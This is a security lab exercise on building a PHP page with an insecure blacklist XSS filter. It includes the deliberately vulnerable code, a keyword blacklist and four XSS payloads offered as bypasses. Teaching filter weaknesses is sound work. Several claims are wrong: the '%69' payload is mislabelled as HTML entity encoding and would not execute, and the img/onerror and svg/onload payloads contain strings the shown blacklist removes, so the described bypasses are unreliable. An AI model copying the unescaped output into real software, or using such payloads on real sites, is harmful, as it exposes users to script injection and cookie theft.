# Write A Web Application With Insecure XSS Filters
An insecure XSS filter occurs when an application fails to properly validate user input, allowing attackers to inject malicious code into web pages. Some developers use blacklists to block dangerous strings like "<script" or "onload=" but often miss edge cases, leaving the application vulnerable to XSS attacks.

## References
- [OWASP - XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) by OWASP

## Tasks
- Write a simple web application containing multiple input fields that are vulnerable to cross-site scripting
- Apply insecure filtering mechanisms to these input fields, such as a blacklist that attempts to block commonly known dangerous XSS keywords
- Develop a blacklist containing at least 30 dangerous XSS keywords (e.g., "<script>", "onload=", "alert(", etc.) that you plan to use to try and protect the input fields
- Use various XSS techniques, such as HTML encoding, JavaScript obfuscation, and bypassing blacklist filters, to inject malicious JavaScript code into the input fields
- Verify that the injected malicious JavaScript code is executed on the web application's frontend, demonstrating the bypass of the insecure XSS filters

## Steps With Solutions
1. PHP for vulnerable web application:
   ```
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>XSS Vulnerable Web Application</title>
    </head>
    <body>
        <h1>Submit Your Input</h1>
        <form action="" method="POST">
            <label for="user_input">Enter something:</label>
            <input type="text" name="user_input" id="user_input">
            <br><br>
            <button type="submit">Submit</button>
        </form>
    
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Get the user input from the form
            $user_input = $_POST['user_input'];
    
            // Blacklist-based filtering (insecure)
            $blacklist = [
                "<script>", "</script>", "onload=", "onerror=", "alert(", "javascript:", "<img", "<iframe", "<svg", "<a", "<div", 
                "<body", "<object", "<embed", "style=", "expression(", "document.cookie", "window.location", "eval(", 
                "setTimeout(", "setInterval(", "localStorage", "sessionStorage", "innerHTML", "outerHTML", "write(", "onmouseover=",
                "onfocus=", "onclick=", "onblur=", "onchange=", "onkeypress=", "onkeydown=", "onkeyup="
            ];
    
            // Replace blacklisted strings with an empty string (insecure filter)
            foreach ($blacklist as $dangerous_string) {
                $user_input = str_ireplace($dangerous_string, '', $user_input);
            }
    
            // Display the filtered user input (vulnerable to XSS)
            echo "<h2>Output:</h2>";
            echo "<p>" . $user_input . "</p>";
        }
        ?>
    </body>
    </html>
    ```
2. Insecure XSS filtering mechanism
- The PHP code retrieves the user input and processes it through a blacklist-based filter.
- The blacklist contains common XSS vectors (like <script>, onload=, etc.) which are removed from the user input.
- This method is insecure because:
  - It only removes known keywords, leaving edge cases and obfuscated payloads unfiltered.
  - Blacklist filtering can be bypassed by encoding, escaping, or obfuscating payloads.
3. Testing bypasses in the application with XSS payloads
    1. HTML Entity Encoding Bypass:
       `<scr%69pt>alert('XSS')</scr%69pt>`
       - The filter might not decode the `%69`, allowing the script to bypass the filter
2. Broken-Up Script Tags:
       `<scr<script>ipt>alert('XSS')</scr<script>ipt>`
       - By splitting up the `<script>` tag, the filter might not catch the malicious code
3. Onerror Event in an Image:
       `<img src=x onerror=alert('XSS')>`
       - Using event handlers like onerror, you can inject code via HTML elements
4. JavaScript Obfuscation:
       `<svg/onload=alert('XSS')>`
       - SVG tags are often overlooked by filters, and the event handler can still execute the script
